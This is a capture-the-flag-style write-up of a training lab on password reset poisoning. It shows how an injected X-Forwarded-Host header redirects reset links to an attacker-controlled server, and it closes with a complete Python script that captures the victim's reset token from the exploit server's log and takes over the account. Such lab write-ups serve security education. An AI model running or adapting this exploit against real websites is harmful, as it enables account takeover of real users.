# Lab: Password reset poisoning via middleware

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

---

# Password Reset Flow:

### Click on `Forgot password?`:
![image](https://github.com/user-attachments/assets/a03835d0-333d-48d2-bd90-145771698435)

---

### Enter the username:
![image](https://github.com/user-attachments/assets/e3297070-437e-4cc7-9938-ea19c19ab408)

---

### Access our email by clicking `Go to exploit server`, then scrolling down and clicking on `Email client`:
![image](https://github.com/user-attachments/assets/6898b6d6-9360-4c9c-9393-7036eac7969d)

---

### Click on the link provided in the email:
![image](https://github.com/user-attachments/assets/d2ebabb0-b7cc-4e3d-b7b4-5345f4a8f46b)


---

### Enter the new password in the form:
![image](https://github.com/user-attachments/assets/aea95600-47b1-4228-bef0-434f52cc206e)

---

## Attempt to replicate the process for the user `carlos`. Send the main requests of the process to the repeater.

We can see that the server constructs the "reset link" using the `Origin` header value, for example, "https://0a2f00ae043060bb82564d82004c006e.web-security-academy.net/". We can attempt to trick the server by injecting the `X-Forwarded-Host` header. If the server prioritizes the `X-Forwarded-Host` header over the `Origin` header, it would use the malicious value provided in the `X-Forwarded-Host` header to construct the reset link.

By injecting the X-Forwarded-Host header, we can manipulate the value the server uses to construct the reset link. For instance, if we send the following request:
![image](https://github.com/user-attachments/assets/72260c58-93a4-42de-bf45-b49dee829e60)

---

### Check our email and confirm that we have received an email with the password reset URL pointing to our server:
![image](https://github.com/user-attachments/assets/30037c03-e232-41bd-aabb-7e659bf1dcdd)

---

### As observed, this injection could be used to execute an attack.

---

### Send the same request but for the user `carlos`:
![image](https://github.com/user-attachments/assets/715daa03-a69e-4c53-8090-3248592baa03)

---

### Wait to receive the password reset request on our server:
![image](https://github.com/user-attachments/assets/dadeb2a2-bd96-4516-b5eb-c94b256e7d43)

---

### Send the `GET` request to access the reset form:
![image](https://github.com/user-attachments/assets/2870b5f8-f8f5-4d53-8120-81cdcf8135d8)

---

### Reset the password:
![image](https://github.com/user-attachments/assets/14823296-df73-478d-8501-74c3d4de5a80)

---

### Log in and solve the lab:
![image](https://github.com/user-attachments/assets/9b99c0f8-92f9-4a80-8e23-bb5325f0cc20)


---

- Exploit:

```python
from bs4 import BeautifulSoup
import re
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
session = requests.Session()
url = 'https://0a0c004703e21a82816743f3003d0057.web-security-academy.net'


resp = session.get(url, verify=False, proxies=proxies)
html = resp.content.decode()

soup = BeautifulSoup(html, 'html.parser')
url_server = soup.find("a", id="exploit-link")["href"]  # i.e: https://exploit-0a9e006f04d05b02810f4c110147007e.exploit-server.net
url_exploit = url_server + '/exploit'
url_email = url_server + '/email'
url_log = url_server + '/log'
url_forgot_password = url + '/forgot-password'

r_get_forg_pass = session.get(url_forgot_password, verify=False, proxies=proxies)
url_forwarded = url_server.split('://')[1]
data = {'username':'carlos'}
headers = {'X-Forwarded-Host':url_forwarded}
r_post_forg_pass = session.post(url_forgot_password, data=data, headers=headers, verify=False, proxies=proxies)
r_email = session.get(url_email, verify=False, proxies=proxies)

r_log = session.get(url_log, verify=False, proxies=proxies)

soup = BeautifulSoup(r_log.text, 'html.parser')
pre_content = soup.find('pre').getText().splitlines()
lines = [line.strip() for line in pre_content if 'GET /forgot-password?temp-forgot-password-token=' in line]
line = lines[-1]
pattern = r'GET (/forgot-password\?temp-forgot-password-token=[\w\d]+)'
match = re.search(pattern, line)
temp_token_url = match.group(0).split(' ')[1]
token = temp_token_url.split('=')[1]

url_reset_password = url + temp_token_url
r_get_reset_password = session.get(url_reset_password, verify=False, proxies=proxies)
soup = BeautifulSoup(r_get_reset_password.text, 'html.parser')
params = soup.find_all('input')
token_param = params[0]['name']
pwd_1 = params[1]['name']
pwd_2 = params[2]['name']
data = {token_param:token, pwd_1:'password', pwd_2:'password'}
r_post_reset_password = session.post(url_reset_password, data=data, verify=False, proxies=proxies)

url_login= url + '/login'
data = {'username':'carlos', 'password':'password'}
r_post_login = session.post(url_login, data=data, verify=False, proxies=proxies)

if 'Your username is: carlos' in r_post_login.text:
    print('Lab Solved!')
```
